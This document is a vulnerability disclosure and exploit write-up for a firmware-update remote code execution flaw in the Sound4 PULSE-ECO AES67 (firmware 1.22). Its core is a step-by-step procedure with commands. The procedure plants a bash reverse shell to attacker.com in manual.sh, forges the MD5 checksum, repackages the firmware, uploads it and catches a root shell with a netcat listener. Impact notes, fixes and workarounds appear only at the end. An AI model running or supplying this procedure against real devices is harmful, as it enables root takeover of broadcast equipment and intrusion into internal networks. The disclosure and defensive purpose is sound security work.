# Sound4 PULSE-ECO AES67 (Firmware 1.22) - Remote Code Execution (RCE)

## Description

The Sound4 PULSE-ECO AES67 web-based management interface is vulnerable to Remote Code Execution (RCE) via a malicious firmware update package. The update mechanism fails to validate the integrity of `manual.sh`, allowing an attacker to inject arbitrary commands by modifying this script and repackaging the firmware.

## Product:
- **Vendor**: Sound4
- **Model**: PULSE-ECO AES67
- **Firmware/Software**: 1.22

## Vulnerability:
- **Type**: Remote Code Execution (RCE)
- **Impact**: Full remote shell access as root via firmware update mechanism.
- **Access Required**: Web-based management interface login

## Vulnerable Endpoints:
- `/settings` → Firmware Upload (Software Update)

## Exploit Summary:
An attacker with access to the web-based admin interface can craft a malicious firmware update package that includes a backdoored `manual.sh` file, leading to remote code execution during the update process.

## Exploitation Steps:

1. **Download the Original Firmware**  
   From the official Sound4 support page:  
https://www.sound4helpdesk.com/pulse-eco-downloads


2. **Extract Firmware**  
```bash
tar -xvf PULSE-AES67-eco_v1.22.tar
```
3. **Modify manual.sh**
Replace or append your reverse shell in manual.sh:
```bash
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > manual.sh
chmod +x manual.sh
```
4. **Update md5sum File**
Recalculate the checksum and replace it in md5sum:
```bash
md5sum manual.sh 
nano md5sum
```
5. **Prepare Firmware Structure**
Ensure these files are present:

    manual.sh (malicious)

    md5sum

    md5sum.gpg

    versions.sh

    warnings.xml

6. **Repackage Firmware**
```bash
tar -cf PULSE-AES67-eco_v1.22 ./
xz -C crc64 -k PULSE-AES67-eco_v1.22
mv PULSE-AES67-eco_v1.22.xz PULSE-AES67-eco_v1.22.upgbox
```
7. **Upload via Web Interface**

        Login to the web admin interface of the Sound4 device

        Navigate to: Settings → Software Update

        Upload the modified .upgbox file

8. **Trigger and Receive Reverse Shell**
    Once uploaded, the device executes manual.sh, and the reverse shell is triggered.

## Notes:

    Ensure listener is running on your attack machine (e.g., nc -lvnp 4444).

    The vulnerability relies on the firmware verification process trusting the MD5 hash and not validating against a secure signature.

## Proof of Concept (PoC) 
https://github.com/user-attachments/assets/44f15b92-05da-4378-b9a7-7f46a19ecc86

## Impact

Successful exploitation allows a remote attacker to:

    Execute arbitrary shell commands as root

    Gain persistent access to the device

    Modify system behavior or firmware

    Pivot to internal networks if the device is not properly segmented

## Suggested Fixes

    Implement strict integrity checks (cryptographic signature verification) during firmware upload.

    Restrict upload functionality to trusted administrators only.

    Sanitize and validate manual.sh execution.

## Workarounds

    Disable firmware upload functionality via the web interface if not in use.

    Use access control lists (ACLs) and firewall rules to restrict access to the web interface.

    Monitor firmware integrity by verifying checksums and timestamps regularly.

